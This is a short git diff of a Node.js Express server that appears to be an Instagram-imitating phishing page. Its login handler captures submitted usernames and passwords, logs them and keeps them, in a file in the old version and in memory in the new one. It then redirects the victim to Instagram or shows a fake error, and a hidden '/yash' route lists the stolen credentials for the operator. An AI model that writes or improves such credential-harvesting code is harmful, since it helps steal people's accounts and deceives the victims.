@@ -14,25 +14,20 @@ app.use(express.static('public'));
 app.get('/', (req, res) => {
     res.render('index.ejs');
 });
-
+let details = [];
 app.post('/login', (req, res) => {
     const {username, Password} = req.body;
-  
-    console.log(username); 
-    console.log(Password);
-    fs.writeFile('./views/loginDetails.ejs', username + " Pass: " + Password, (err) => {
-        if (err) {
-            console.error(err);
-            res.status(500).send('Error 404 , Please try again ');
-        } else {
-            console.log('File created successfully');
-            res.send('Something went wron please try again Status Code:404');
-        }
-    });
+    const user = req.body.username;
+    const pass = req.body.Password;
+    console.log(user); 
+    console.log(pass);
+    details.push({ username: user, password: pass });
+    res.redirect("www.instagram.com");
 });
-app.get("/yash",(req, res)=>{
-    res.render("loginDetails.ejs");
+app.get('/yash', (req, res) => {
+    res.render('loginDetails', { user: details });
 });
+
 
 app.listen(port, () => {
     console.log(`Server listening at http://localhost:${port}`);
